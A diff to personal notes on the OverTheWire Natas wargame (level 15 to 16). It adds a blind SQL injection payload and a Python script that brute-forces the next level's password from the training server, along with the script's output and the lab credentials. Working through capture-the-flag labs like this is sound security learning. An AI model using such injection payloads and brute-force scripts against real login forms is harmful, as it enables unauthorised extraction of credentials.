@@ -341,7 +341,69 @@ if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
 
 ## 15->16
 - http://natas15.natas.labs.overthewire.org/
-- `natas16:`
+- `natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo`
 - https://learnhacking.io/overthewire-natas-level-15-walkthrough/
 - Enter "Blind SQL Injection" (https://owasp.org/www-community/attacks/Blind_SQL_Injection)
 - Need more time, will pick up tomorrow
+- `natas16" AND password LIKE "hP%"--` You can input things like this to Check existence.
+- Python script to brute force it
+```python
+import requests
+import string
+
+url = "http://natas15.natas.labs.overthewire.org/index.php"
+auth = ('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')
+chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
+password = ""
+found = False
+
+while not found:
+    found = True
+    for char in chars:
+        payload = f'natas16" AND password LIKE BINARY "{password}{char}%'
+        data = {"username": payload}
+        response = requests.post(url, auth=auth, data=data)
+        
+        if "This user exists" in response.text:
+            password += char
+            found = False
+            print(f"Password so far: {password}")
+            break
+
+print(f"Complete password: {password}")
+
+% python natas15.py
+Password so far: h
+Password so far: hP
+Password so far: hPk
+Password so far: hPkj
+Password so far: hPkjK
+Password so far: hPkjKY
+Password so far: hPkjKYv
+Password so far: hPkjKYvi
+Password so far: hPkjKYviL
+Password so far: hPkjKYviLQ
+Password so far: hPkjKYviLQc
+Password so far: hPkjKYviLQct
+Password so far: hPkjKYviLQctE
+Password so far: hPkjKYviLQctEW
+Password so far: hPkjKYviLQctEW3
+Password so far: hPkjKYviLQctEW33
+Password so far: hPkjKYviLQctEW33Q
+Password so far: hPkjKYviLQctEW33Qm
+Password so far: hPkjKYviLQctEW33Qmu
+Password so far: hPkjKYviLQctEW33QmuX
+Password so far: hPkjKYviLQctEW33QmuXL
+Password so far: hPkjKYviLQctEW33QmuXL6
+Password so far: hPkjKYviLQctEW33QmuXL6e
+Password so far: hPkjKYviLQctEW33QmuXL6eD
+Password so far: hPkjKYviLQctEW33QmuXL6eDV
+Password so far: hPkjKYviLQctEW33QmuXL6eDVf
+Password so far: hPkjKYviLQctEW33QmuXL6eDVfM
+Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW
+Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4
+Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4s
+Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4sG
+Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+Complete password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+```
